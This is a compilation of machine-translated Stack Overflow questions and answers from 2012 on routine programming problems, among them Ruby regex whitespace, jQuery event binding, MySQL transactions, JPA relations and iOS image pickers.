> ID：13287701
> 
> 赞同：9
> 
> 时间：2012-11-08T10:59:23.363
> 
> 标签：ruby, regex, ruby-2.0

在 ruby​​ 1.9.3 中，正则表达式引擎不会将 nbsp (\u00A0) 视为空格 (\s)。这对我来说常常是一个无赖。

所以我的问题是，这会在 2.0 中发生变化吗？如果没有，有没有办法猴子补丁解决方案？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-08T11:50:57.260

使用 Unicode 属性（您需要声明匹配的源代码编码才能使用）：

```
# encoding=utf-8 
if subject ~= /\p{Z}/
    # subject contains whitespace or other separators 
```

或使用 POSIX 字符类：

```
if subject ~= /[[:space:]]/ 
```

根据[文档](http://ruby-doc.org/core-2.0/Regexp.html)，`\s`只会`[ \t\r\n\f]`在现在和将来匹配。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-01-26T04:13:50.027

**在 Ruby 中，我建议使用“空格分隔符**”的 Unicode 字符类`\p{Zs}`：

```
/\p{Zs}/u  =~  "\xC2\xA0"
/\p{Zs}/u  =~  "\u00A0"
/\p{Zs}/u  =~  HTMLEntities.new.decode('&nbsp;') 
```

[有关更多Unicode 字符属性](http://ruby-doc.org/core-2.2.1/Regexp.html#class-Regexp-label-Character+Properties)，请参阅 Ruby 文档。

注意：确保您的输入字符串是有效的 UTF-8 编码。其他编码中也有不间断的空格，例如 ISO-8859-1 (Latin1) 中的“\xA0”。[有关“不间断空间”的更多信息](https://en.wikipedia.org/wiki/Non-breaking_space)。

仅供参考：在大多数支持 Unicode 的 RegExp 风格和编程语言中，字符类`\s`通常包括来自 Unicode“分隔符”属性的所有字符`\p{Z}`（如 Tim Pietcker 所述）；但是，**Java**和**Ruby**是这里流行的例外，并且`\s`只匹配`[ \t\r\n\f]`.

# javascript - jQuery 在 Firefox、Safari 中工作，但在 Chrome 中不工作

> ID：13287703
> 
> 赞同：0
> 
> 时间：2012-11-08T10:59:30.697
> 
> 标签：javascript, jquery, google-chrome

我在firefox、safari 和ie9 中使用jquery 编写了一些代码。但铬不喜欢它。chrome 控制台中没有明显的消息。我正在碰壁，希望有人能有所启发。脚本只是显示/隐藏一些工具提示。有任何想法吗？在这里摆弄，更改的代码仍然没有改变行为。

[http://jsfiddle.net/qAfwJ/](http://jsfiddle.net/qAfwJ/)

```
$(document).ready(function(){
    //custom toolTip Written by CASherwood but not working in ie9/chrome
        var ShowId;
        var id;
        var contentholder = $(".contentBox");
        var toolTip = $(".info");
        var idHashString = '#info';
        var idString = 'id';

            function showToolTip(name, id){
                  id = name + id;
                  $(id).fadeIn(1000);
            }

            function hideToolTip(name, id){
                  id = name + id;
                  $(id).fadeOut(1000);
            }

        $(toolTip).mouseover(function(){
                ShowId = $(this).attr(idString);
                showToolTip(idHashString, ShowId);
        });

        $(contentholder).mouseleave(function(){
            ShowId = $(this).find('.info').attr(idString);
            hideToolTip(idHashString, ShowId);
        });

}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T11:07:34.337

这里有几件事，你正在设置一个变量`var toolTip = $(".info");`

然后使用同一个变量为其添加一个函数。你在这里所做的实际上是

```
$($(".info")).mouseover( 
```

代替

```
var toolTip = $(".info");
toolTip.mouseover( 
```

你也可以考虑使用

```
jquery.hover(handlerIn(eventObject) , handlerOut(eventObject)  ); 
```

[http://api.jquery.com/hover/](http://api.jquery.com/hover/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T11:03:53.573

好的，我在这里注意到的一件事是您使用 jQuery 选择器将一些元素包装了两次。

```
var contentholder = $(".contentBox");
$(contentholder).mouseleave(function(){
  ...
}); 
```

基本上评估的是这个 -

```
$($(".contentBox")) 
```

这看起来不太好，我不太确定它是否会按预期工作。即使是这样，跨浏览器兼容性的问题也可能会发挥作用，我相信这就是您所遇到的。如果您已经捕获了元素并且不只是将选择器存储为字符串，则无需使用`$`语法再次包装元素。

```
var contentholder = $(".contentBox");
contentholder.mouseleave(function(){
  ...
}); 
```

当您从字符串和变量构造选择器时，您应该以与此类似的方式执行此操作 -

```
var elementId = 'the_elements_id';
$('#'+elementId).on('click',handler); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T11:04:05.953

我会从改变开始

```
 $(toolTip).mouseover(function(){
                ShowId = $(this).attr(idString);
                showToolTip(idHashString, ShowId);
        });

        $(contentholder).mouseleave(function(){
            ShowId = $(this).find('.info').attr(idString);
            hideToolTip(idHashString, ShowId);
        }); 
```

至

```
 toolTip.mouseover(function(){
                ShowId = $(this).attr(idString);
                showToolTip(idHashString, ShowId);
        });

        contentholder.mouseleave(function(){
            ShowId = $(this).find('.info').attr(idString);
            hideToolTip(idHashString, ShowId);
        }); 
```

因为您的 toolTip 和 contentholder 变量已经是 jquery 对象。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-08T11:06:37.830

我不确定也没有测试过，但是如果您尝试在 The 之前或之后移动两个函数 (`showToolTip()`和) 可能会被视为某种内部函数而不是全局函数，这可能是一回事。`hideToolTip()``$(function(){});`

# javascript - for循环内的事务

> ID：13287708
> 
> 赞同：0
> 
> 时间：2012-11-08T10:59:53.247
> 
> 标签：javascript, html, for-loop, transactions, web-sql

我想在 for 循环中运行事务。我的代码是：-

```
 for(var i=0;i<len;i++){
      // some code

      alert('before transaction');

      var db = window.openDatabase("Database", "1.0", "Pin Point", 200000);
      db.transaction(fetchSubList, errorLists);  

      alert('after transaction');
  }

 function fetchSubList(tx) {  
    tx.executeSql('some QUERY', [], fetchSubListSuccess, errorLists);
  }

function fetchSubListSuccess(tx, results) {
  alert("fetchSubListSuccess()...");

  // some code
} 
```

但问题是，在警报之后（交易前）我直接得到警报（交易后），只有当 for 循环结束时，交易才开始......

我按照[这个](https://stackoverflow.com/questions/4825455/web-sql-database-javascript-loop)链接解决了，但我仍然无法弄清楚....

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-06T08:43:17.383

这是不可能的......我们需要重构代码，使代码看起来像这样：-

```
 db.transaction(function(tx) 
    {

      // some value
      var loop_limit = 10

      for(var i=0; i<loop_limit;i++ ){ // ITERATE HERE
        tx.executeSql(Statement, [],Sucess, error);
      }

    }); 
```

# eclipse - 我无法导入 i-jetty 的“现有 Maven 项目”

> ID：13287711
> 
> 赞同：0
> 
> 时间：2012-11-08T11:00:05.013
> 
> 标签：eclipse, maven, eclipse-plugin, maven-plugin, ijetty

[他们说](http://code.google.com/p/i-jetty/wiki/BuildingConsoleWebApplication)，

cd $IJETTY_HOME/控制台

mvn 干净安装

这将在 $IJETTY_HOME/console/webapp/target 中生成一个 war 文件，以及在 $IJETTY_HOME/console/apk/target 中的 apk（尽管正如我们所提到的，您可能对此不感兴趣）。

但我收到以下错误（......哦，我的上帝。我无法上传图片；0）

* * *

**

```
[INFO] --- exec-maven-plugin:1.2:exec (generate-dex) @ console ---
Unable to access jarfile ${env.ANDROID_HOME}/platform-tools/lib/dx.jar
[INFO] ------------------------------------------------------------------------
[INFO] Reactor Summary:
[INFO] 
[INFO] I-Jetty :: Console Parent ......................... SUCCESS [0.241s]
[INFO] I-Jetty :: Console Webapp ......................... FAILURE [2.431s]
[INFO] I-Jetty :: Console Android Installer .............. SKIPPED
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 4.122s
[INFO] Finished at: Thu Nov 08 19:33:47 KST 2012
[INFO] Final Memory: 14M/81M
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.codehaus.mojo:exec-maven-plugin:1.2:exec (generate-dex) on project console: Command execution failed. Process exited with an error: 1(Exit value: 1) -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoExecutionException
[ERROR] 
[ERROR] After correcting the problems, you can resume the build with the command
[ERROR]   mvn <goals> -rf :console** 
```

* * *

我尝试了“使用 Eclipse 构建”

最后，我得到了与该错误类似的以下错误。

关于导入 Maven 项目，

* * *

**exec-maven-plugin:1.2:exec (1 个错误)
maven-antrun-plugin:1.6:run(1 个错误)
maven-depoendency-plugin:2.3:unpack-dependencies(1 个错误)**

* * *

帮帮我，请。

我在 Mac OS X Lion 上使用 eclipse 安装了 maven 插件 1.3。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-10T01:19:08.073

最后，我自己解决了。

我错过了导出 android sdk 路径（导出 ANDROID_HOME=/opt/android/android-sdk-linux_86）

我编辑了 pom.xml

从

```
<artifactId>maven-android-plugin</artifactId>
          <version>2.9.0-beta-5</version> 
```

到

```
<artifactId>android-maven-plugin</artifactId>
          <version>3.0.0</version> 
```

谢谢。

# css - 如何将样式设置为父元素

> ID：13287714
> 
> 赞同：0
> 
> 时间：2012-11-08T11:00:28.183
> 
> 标签：css

> **可能重复：**
> [活动孩子的父母的复杂 CSS 选择器](https://stackoverflow.com/questions/45004/complex-css-selector-for-parent-of-active-child)

如何`<li>`在子元素的类中设置我的样式？

例子：

```
<div class"options">
<ul>
   <li> <a href="#"> option 1 </a> </li>
   <li> <a href="#"> option 2 </a> </li>
   <li> <a class="last" href="#"> option 3 </a> </li>

   <li> <a href="#"> option 4 </a> </li>
   <li> <a href="#"> option 5 </a> </li>
   <li> <a class="last" href="#"> option 6 </a> </li>

   <li> <a href="#"> option 7 </a> </li>
   <li> <a href="#"> option 8 </a> </li>
   <li> <a class="last" href="#"> option 9 </a> </li>
</ul>
</div> 
```

我可以`a`用`.options li a.last { ... }`

但是我想要的是申请`margin:0`给父母`li`，我无法控制里面的内容`<li>`，只能控制里面的内容`<a>`。

> 有什么风格技巧吗？

* * *

我要完成的工作：

![在此处输入图像描述](../Images/b3ee1301871b4bcc5d71603a255ed9a8.png)

我有一个 jQuery 循环将`.last`类添加到每 3`<li>`个

```
$(".box-left li").each(function (i) {
    if ((i+1) % 3 == 0) 
        $(this).addClass("last");
}); 
```

但我想了解是否还有其他不涉及 javascript 帮助器的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:04:57.293

可悲的是，这不能用 CSS 完成，我能提供给你的最好的是 jQuery 和它的[`:has`](http://api.jquery.com/has/)选择器。

`a`或者，在标签而不是标签上制作所有边距/填充`li`。这将涉及一些洗牌，但会达到你所需要的

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T11:07:43.943

不幸的是，目前没有办法在 CSS 中选择父元素。

这个问题已经被问过多次，[这个答案](https://stackoverflow.com/questions/45004/complex-css-selector-for-parent-of-active-child/45530#45530)似乎总结得很好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T11:52:02.233

不可能选择子元素的父元素。可能这对你有帮助指定 li{line-height:20px;} li a{display:block;}

# php - 如何从 Symfony2 控制器调用 perl 脚本？

> ID：13287716
> 
> 赞同：1
> 
> 时间：2012-11-08T11:00:35.247
> 
> 标签：php, perl, symfony, controller

我正在尝试从我的 Symfony2 应用程序中实现向信息管理系统的自动提交。其他人为提交编写了一个 perl 脚本。我只需要使用控制器从实体中获取值以作为参数传递给脚本。

我已经通过从命令行运行一个简短的 php 脚本来测试 perl 脚本：

```
<?php

$perlscript = 'test_submit_to_lims.pl';

$output = \shell_exec('perl ' . $perlscript . " 'arg1' 'arg2' 'arg3' ");
echo $output;

?> 
```

这将返回一个字符串，其中包含我的应用程序需要的一些感兴趣的值。

我已将 perl 脚本和相关文件放在一个名为 dependencies 的文件夹中，与我的 Symfony 项目文件夹处于同一级别

我试图在我的控制器中使用类似的代码：

```
...

$arg1 = $form->get('arg1')->getData();
$arg2 = $form->get('arg2')->getData();
$arg3 = $form->get('arg3')->getData();
$pathToScript = '/opt/sfprojects/dependencies';
$perlScript = "$pathToScript/test_submit_to_lims.pl";
$output = \shell_exec('perl '.$perlScript." $arg1 $arg2 $arg3 ");
var_dump($output);

... 
```

这给了我“网络错误：500 内部服务器错误 - [http://www2-mywebsite.org/myEntity/create](http://www2-mywebsite.org/myEntity/create) ”

我不确定这个错误是否是由我的 php 代码中的一些简单的东西引起的，是否需要在 Symfony 配置文件中以某种方式启用 perl 或其他诸如脚本的位置、文件权限等。

我会很感激任何关于我可能出错的想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T21:23:47.600

检查你的网络服务器和 Symfony 日志，看看你遇到了什么样的错误。Symfony 日志位于项目的 app/logs 目录中（默认情况下）。服务器日志位置取决于您的配置。

请记住，您可以使用开发控制器 (app_dev.php) 查看有关错误的更多详细信息（包括堆栈跟踪）。

要实际运行您的命令，请考虑使用[Process 组件](http://symfony.com/doc/master/components/process.html)。

# php - 事务 MySql 和 php

> ID：13287723
> 
> 赞同：1
> 
> 时间：2012-11-08T11:00:57.870
> 
> 标签：php, mysql, transactions

我对通过 php 脚本运行事务感到困惑。在我的 MySql 中，自动提交设置为 1，但是当我运行脚本时

例如：mysql_query("开始交易");

```
$sql="INSERT INTO 
`address`(`Address_Id`, 
`Address_Line1`, 
`Address_line2`, 
`Zip`, 
`Created_By`,
 `Created_Date`, 
 `Updated_By`, 
 `Updated_Date`) 
VALUES ('2','this is test1','test2','210','SYSTEM','NOW()','SYSTEM','NOW()')";

mysql_query($sql); 
```

当我不提交时，表中插入的记录为零。只有当我发出提交命令时才会出现记录。

***另外请告诉我如果在 php 脚本中我开始事务然后不给出回滚或提交语句会发生什么***

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T11:04:49.987

[http://dev.mysql.com/doc/refman/5.5/en/commit.html](http://dev.mysql.com/doc/refman/5.5/en/commit.html)：

> 默认情况下，MySQL 在启用自动提交模式的情况下运行。这意味着一旦您执行更新（修改）表的语句，MySQL 就会将更新存储在磁盘上以使其永久化。

但是，如果您`START TRANSACTION`明确指定 - 那么它不会被考虑在内，因此您在应该提交的事务中工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T11:11:42.070

尝试这样做。

```
mysql_query("BEGIN");

        $query="";
        $result=mysql_query($query);

        if($result==0)
        {
            mysql_query("ROLLBACK");
           echo $error_message;
          // mysql_query($query_setId);
           die();
        }

    mysql_query("COMMIT"); 
```

# jquery - jQuery - 如果窗口不够高则隐藏项目

> ID：13287724
> 
> 赞同：0
> 
> 时间：2012-11-08T11:00:59.130
> 
> 标签：jquery, menu, resize, window

我在页面左侧有这个固定的菜单栏。但是，如果窗口不够高而无法同时显示所有项目，我希望隐藏菜单项。固定菜单栏隐藏了溢出以避免滚动条。我当前的脚本做得很好，但它会变得很长，因为我可能有大约 30 个不同的菜单项，这意味着它需要许多 if/else 语句来执行此操作。每次调整窗口大小时，我都会执行此函数。

```
function resizeMenu() {
    var win_h = $(window).height();
    if (win_h < 220) {
        $('div.list_item_btn').show().slice(1).hide();
        $('.down_arrow').show();
    } else if (win_h < 288) {
        $('div.list_item_btn').show().slice(2).hide();
        $('.down_arrow').show();
    } else if (win_h < 356) {
        $('div.list_item_btn').show().slice(3).hide();
        $('.down_arrow').show();
    } else {
        $('div.list_item_btn').show()
    }
} 
```

因为每个 item-s 的高度都是 68px，所以我必须不断地应用`68`增加的数量。我知道有一个更好的解决方案，但这是棘手的事情。如果没有显示所有项目，我想在底部显示一个箭头。单击此箭头时，我希望菜单项向上滑动并在顶部隐藏 1，在底部再显示 1。

但是我不知道如何将内容向上滑动，只要它被隐藏..这没有任何意义，我有点失败了..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:41:45.477

您可以使用[此处](https://stackoverflow.com/a/7557433/1520714)的函数来检查是否`list_item_btn`在视口中，如果不在则隐藏它。

```
var anyHidden = 0;
$("div.list_item_btn").each(function() {
  if (!elementInViewport($(this))) {
    anyHidden = 1;
    $(this).hide();
  } else {
    $(this).show();
  }
}
if (anyHidden>0) {
  $(".down_arrow").show();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T11:14:19.317

```
function resizeMenu() { 
var win_h = $(window).height();   
var height = 220;

    for(var i=1; i <= $('div.list_item_btn').length; i++){
              if (win_h < height) {
                $('div.list_item_btn').show().slice(i).hide();
                $('.down_arrow').show();
                height += 68;
            } else{
                $('div.list_item_btn').show()
                break;
            }
        }
   }//end function 
```

像这样的东西？虽然不知道你想切片什么，但这应该会大大缩短你的代码。

# java - DataNucleus 中的多对一单向关系

> ID：13287726
> 
> 赞同：0
> 
> 时间：2012-11-08T11:01:12.593
> 
> 标签：java, jpa, jdo, datanucleus, many-to-one

对于上下文，客户端我使用 MVP 模式，所以带有`One`列表的视图只知道 ID，当我`Many`在服务器上收到我的新的时，我希望能够只更新`One`的外键，使用“setOneId”或`One`ID 设置为所需值的空对象。

所以我尝试在 DataNucleus 中创建一个多对一的单向，我有点挣扎。我可以使用 JDO 或 JPA，我真的不在乎。在 JPA 中，我尝试了这个：

```
@Entity
public class Many {
    @Id
    String id;

    @ManyToOne
    @Join(name = "idOne")
    One one;
}

@Entity
public class One {
    @Id
    String id;
} 
```

这几乎是我想要的。创建了一对多但使用连接表。我想有一个直接的关系。当我插入/更新 a 时`Many`，我不想插入/更新相关的`One`，只需在我的对象`idOne`中使用好的 id更新。`Many`

我找到了这篇[博文](http://ayushsuman.blogspot.fr/2010/06/jpa-one-to-many-and-many-to-one.html)，但它与 Hibernate 一起使用，我认为它仍然使用连接表：

```
@Entity
public class Many {
    @Id
    public String id;

    @Column(name="idOne")
    private String idOne;

    @ManyToOne
    @JoinColumn(name="idOne", nullable=false, insertable=false, updatable=false)
    private One one;
} 
```

我试过了，但我得到了[这个错误](http://code.google.com/p/datanucleus-appengine/issues/detail?id=198)。

我不明白我是如何挣扎的。我的目标是有一个表来保存一些参考数据（如国家列表作为类），以及我创建/更新而不创建/更新参考`One`的“工作项目”列表（如城镇作为类）`Many`数据，只是它在`Many`对象中的外键。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T08:43:41.713

```
@Entity
public class A {
    @Id
    String id;

    @OneToOne(cascade=CascadeType.ALL)
    B b;
}

@Entity
public class B {
    @Id
    String id;
} 
```

然后如果您将初始对象保留为

```
tx.begin();
A a = new A("FirstA");
B b1 = new B("FirstB");
B b2 = new B("SecondB");
a.setB(b1);
em.persist(a);
em.persist(b2);
tx.commit();

... (some time later)
tx.begin();
A a = em.find(A.class, "FirstA");
B b2 = em.getReference(B.class, "SecondB");

// update the B in A to the second one
a.setB(b2);
tx.commit(); 
```

这会更新 A 和 B 之间的 FK。再简单不过了

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T11:27:13.310

如果它是单向关联，并且`Many`是拥有方（根据您的第二个示例），那么您正朝着错误的方向前进。将更新和插入责任委托给单向关系的拥有方没有多大意义（正如 insertable=false 和 updateable=false 所做的那样）。

编辑：更新的答案所以你想要的是多对一，在拥有方有一个外键列。尝试这个

```
@Entity
public class Many {
    @Id
    String id;

    @ManyToOne
    @JoinColumn(name = "foreignKeyColumn")
    One one;
} 
```

# android - 如何保持一一通话？

> ID：13287729
> 
> 赞同：2
> 
> 时间：2012-11-08T11:01:16.413
> 
> 标签：android

我尝试将所有来电置于保持通话中。在来电期间所有保持通话听语音通话。语音通话听接收方。但没有找到此代码，请帮忙？

# sql - 将值引用到 Zend Framework 2

> ID：13287731
> 
> 赞同：0
> 
> 时间：2012-11-08T11:01:27.347
> 
> 标签：sql, zend-framework2, quote

我正在使用 ZF2 开发应用程序。在我的应用程序中，我必须在数据库中插入许多行（大约 900 行）。

我有一个表模型，所以我首先尝试这样做：

```
$table->insert(array('x' => $x, 'y' => $y)); 
```

在我的循环中。这在技术上是可行的，但这太慢了，以至于我几乎无法在 php 超时之前插入一半的数据（而且我无法更改超时）。

然后，我决定使用准备好的陈述。所以我已经在循环之外准备了它，然后在我的循环中执行它......它甚至更慢。

因此，我决定停止使用 ZF2 工具，因为它们似乎太慢而无法在我的情况下使用，并且我已经创建了自己的请求。我正在使用 mysql，所以我可以用我的所有值做一个请求。但是我在任何界面中都找不到任何方法来逃避我的价值观......

有没有办法做到这一点？

感谢您的帮助，并为我糟糕的英语感到抱歉。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-23T11:16:42.467

如果要执行原始查询，可以使用数据库适配器：

```
$sql = 'SELECT * FROM '
    . $adapter->platform->quoteIdentifier('users')
    . ' WHERE ' . $adapter->platform->quoteIdentifier('id') . ' = ' . $adapter->driver->formatParameterName('id');

/* @var $statement \Zend\Db\Adapter\Driver\StatementInterface */
$statement = $adapter->query($sql);
$parameters = array('id' => 99);

/* @var $results Zend\Db\ResultSet\ResultSet */
$results = $statement->execute($parameters);

$row = $results->current(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-10T18:53:19.117

使用事务：[http](http://dev.mysql.com/doc/refman/5.0/en/commit.html) ://dev.mysql.com/doc/refman/5.0/en/commit.html 比将帮助您减少执行时间

# javascript - jQuery 滑块抛出错误：...无法转换 JavaScript 参数 arg 0 [nsIDOMHTMLAnchorElement.appendChild]

> ID：13287735
> 
> 赞同：0
> 
> 时间：2012-11-08T11:01:33.260
> 
> 标签：javascript, jquery

我们的开发网站的滑块在这里完美运行：

[http://allblacks.01dev.co.nz/index.cfm?layout=dnaHome](http://allblacks.01dev.co.nz/index.cfm?layout=dnaHome)

但是，我们刚刚启动了该站点，但它在这里不起作用：

[http://www.allblacks.com/index.cfm?layout=dnaHome](http://www.allblacks.com/index.cfm?layout=dnaHome)

在 firebug 中可以看到一个 js 错误，如果没有一些帮助，我几乎没有希望理解它......

```
NS_ERROR_XPC_BAD_CONVERT_JS: Could not convert JavaScript argument arg 0 [nsIDOMHTMLAnchorElement.appendChild] 
```

虽然这似乎与 facebook 脚本有关

如果需要，我很乐意提供更多信息。任何指针都非常感谢。

**注意：现在**[这里](https://stackoverflow.com/questions/13289399/slider-not-running-with-window-load)有一个关于这个的新问题，经过更多研究可以更好地解释这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-18T10:06:55.517

我们确定问题与未正确调用厚盒 javascript 或某种类型的冲突有关。我们将thickbox js 调用移至js 调用列表的顶部（在jQuery.js 调用之前），这似乎解决了问题。

# web-applications - 为 Bing 将 Shapefile 转换为 kml

> ID：13287736
> 
> 赞同：0
> 
> 时间：2012-11-08T11:01:34.197
> 
> 标签：web-applications, coordinates, kml, bing-maps, shapefile

是否可以将 shapefile 转换为可用于 bing 地图 Web 应用程序的 kml 文件？我已经尝试过 Shp2kml 程序，但是当我使用坐标时，我什么也看不到。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T19:07:02.380

KML 文件只能表示在 WGS84 坐标系中表示的坐标 - 即 -90 和 +90 之间的纬度，以及 -180 和 +180 之间的经度值。从您上面的评论看来，您的 shapefile 目前*没有*在 WGS84 中测量。例如，它可能在美国国家平面坐标系、英国国家电网或 UTM 区域中。

要找出它使用的坐标系，您应该找到一个伴随您的 shapefile 的 .PRJ 文件。这是一个小文本文件，将为您提供坐标系、基准面、本初子午线等的详细信息。这将为您提供转换为 WGS84 所需的信息。

而不是使用 shp2kml，您可能想要研究 OGR2OGR (http://www.gdal.org/ogr2ogr.html)，它既能够将 shapefile 转换为 KML 文件，又能够在此过程中转换坐标系。它还可以在许多其他空间格式和数据库之间进行转换。

# ruby-on-rails - find_or_initialize_by_title 唯一性

> ID：13287741
> 
> 赞同：0
> 
> 时间：2012-11-08T11:01:52.390
> 
> 标签：ruby-on-rails, ruby-on-rails-3, activerecord, associations

我有一个嵌套形式的标签文本字段（它与旅行相关联），它在保存时以逗号分隔，并将单词保存在由逗号分隔的字符串中。我已经跳过了一些障碍来实现它，现在它正在按照我的意愿发生。唯一的缺点是它似乎不会使当前标签成为唯一标签（如果存在，则将现有标签与新的 Trip 关联，而不是制作新标签）

这是代码拆分和单独保存标签：

```
if params[:trip][:tags_attributes].present?
  params[:trip][:tags_attributes].each do |tag| 
   @a = tag[1]['title']
   @a.split(',').each do |single|
      @trip.tags.find_or_initialize_by_title(single)  
   end
  end
end 
```

以防万一我的 Trip.rb：

```
class Trip < ActiveRecord::Base
  attr_accessible :description, :title, :user_id, 
  :triplocations_attributes, :photo, :category_ids, 
  :start_city, :tripphotos_attributes, :img_url, :thumb_url, :images,
  :tags_attributes, :province

  # validates :title, :length => {:minimum => 3}
  # validates :description, :presence => true
  # validates_associated :tags

  has_many :triplocations, :dependent => :destroy
  has_many :tripphotos, :dependent => :destroy

  has_and_belongs_to_many :categories
  has_and_belongs_to_many :tags

  accepts_nested_attributes_for :triplocations, allow_destroy: true
  accepts_nested_attributes_for :tripphotos, allow_destroy: true
  accepts_nested_attributes_for :categories
  accepts_nested_attributes_for :tags

end 
```

提前致谢！

# ios - ios6中的shouldAutorotateToInterfaceOrientation

> ID：13287743
> 
> 赞同：0
> 
> 时间：2012-11-08T11:02:05.193
> 
> 标签：ios, uinavigationcontroller, uiinterfaceorientation

我正在使用`UIImagePickerviewController`通过以下附加代码打开照片库...在调用位代码行之后。应用程序崩溃了......它工作正常`ios5`

```
UIImagePickerController* content = [[UIImagePickerController alloc] init];
content.delegate = self;
content.sourceType = UIImagePickerControllerSourceTypeSavedPhotosAlbum;
[self presentModalViewController:content animated:YES];
[content release]; 
```

这段代码有什么问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T11:19:30.310

Check [Crash on presenting UIImagePickerController under ios6](https://stackoverflow.com/questions/12522491/crash-on-presenting-uiimagepickercontroller-under-ios6) You will get everything you need to make `UIImagePickerviewController` working on iOS 6.0.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T11:30:27.580

```
UIImagePickerController *imagePicker = [[UIImagePickerController alloc] init];
imagePicker.delegate = self;
imagePicker.sourceType = UIImagePickerControllerSourceTypePhotoLibrary;
if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad)
{
  popover = [[UIPopoverController alloc] initWithContentViewController:imagePicker];
  [popover presentPopoverFromRect:cameraButton.frame inView:self.view  
  permittedArrowDirections:UIPopoverArrowDirectionUp animated:YES];
}
else{
 [self presentModalViewController:imagePicker animated:YES];
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T12:03:01.493

我遇到过同样的问题。因为`UIImagePicker`在纵向模式下显示。`UIImagePicker`我通过子类化并实现如下`shouldAutorotate`方法来修复它：

```
- (BOOL)shouldAutorotate
{
    return NO;
} 
```

我已经创建了我的子类 imagePicker 的实例而不是`UIImagePicker`，一切正常。希望这会帮助你。

# mysql - 我无法从三个表中获取数据得到错误 #1111 无效使用组函数

> ID：13287748
> 
> 赞同：0
> 
> 时间：2012-11-08T11:02:23.290
> 
> 标签：mysql, phpmyadmin

我有三张桌子

```
table A
------------------------------------------
filing_no | pet_name | res_name | court_no
------------------------------------------
1         | xyz      | PQR      |  1
------------------------------------------
2         | abc      | def      |  2
------------------------------------------

Table B
-------------------------------
filing_no |purpose_code|next_date
-----------------------------------
2         | 20         |3/8/2012
-----------------------------------
1         | 21         |3/9/2012
-----------------------------------
2         | 22         |3/10/2012
-----------------------------------
1         | 23         |15/11/2012
-----------------------------------

Table C.
-------------------------------------
purpose_code | purpose_name
-------------------------------------
20           | institution
-------------------------------------
21           | summon
-------------------------------------
22           | proceeding
-------------------------------------
23           | order
------------------------------------- 
```

我想要特定法庭的结果，例如：

```
--------------------------------------------------------
filing_no| Pet_name | res_name |purpose_name| next_date
--------------------------------------------------------
1        | xyz      | PQR      | Order      | 15/11/2012 
```

我执行以下查询并得到#1111 - 组函数的使用无效错误。请帮忙。

```
select 

    a.filing_no as "File No", a.case_no as "Registration No", a.pet_name as Petitioner, a.res_name as Accused,  
    a.dt_of_filing as "Date of Inst",MAX(b.Next_date) as "Next Date",c.purpose_name as "Case Stage" 

from filing_t a, Daily_proc b, Purpose_t c 
where 
    a.filing_no = b.filing_no 
and c.purpose_code = (
          select purpose_code 
          from Daily_proc 
          where 
              filing_no = a.filing_no 
          and next_date = (
               select MAX(next_date) 
               from Daily_proc 
               where filing_no = a.filing_no
          )
    ) 
and a.court_no = 1 
and a.ci_cri = 2 
and a.status = 'P' 
group by b.filing_no 
order by a.dt_of_filing DESC LIMIT 0 , 2000 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T05:59:19.650

答案由@Devart 分享，我非常感谢他。

SELECT a.filing_no, a.pet_name, a.res_name, c. purpose_name, b.next_date FROM a JOIN (SELECT * FROM (SELECT * FROM b ORDER BY Filing_no, next_date DESC) t GROUP BY Filing_no) b ON a.filing_no = b.filing_no JOIN c ON b. purpose_code = c. purpose_code WHERE a.court_no = 1;

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T11:14:48.960

您只能选择`GROUP BY`聚合函数中的列和结果。例如，`a.pet_name`当有不同的相同时，您希望返回什么`b.filling_no`？

# mysql - 我应该在单次选择后提交吗

> ID：13287749
> 
> 赞同：16
> 
> 时间：2012-11-08T11:02:25.213
> 
> 标签：mysql, mysql-python

我正在使用 MySQLdb 模块从 python 处理 MySQL 5.0。

考虑一个简单的函数来加载和返回整个数据库表的内容：

```
def load_items(connection):
    cursor = connection.cursor()
    cursor.execute("SELECT * FROM MyTable")
    return cursor.fetchall() 
```

此查询旨在成为简单的数据加载，并且除了该单个`SELECT`语句之外没有任何事务行为。

运行此查询后，可能需要一段时间才能再次使用同一连接执行其他任务，但同时其他连接仍可在数据库上运行。

我是否应该在通话`connection.commit()`后立即`cursor.execute(...)`拨打电话以确保操作没有在连接上留下未完成的事务？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-11-08T11:33:59.463

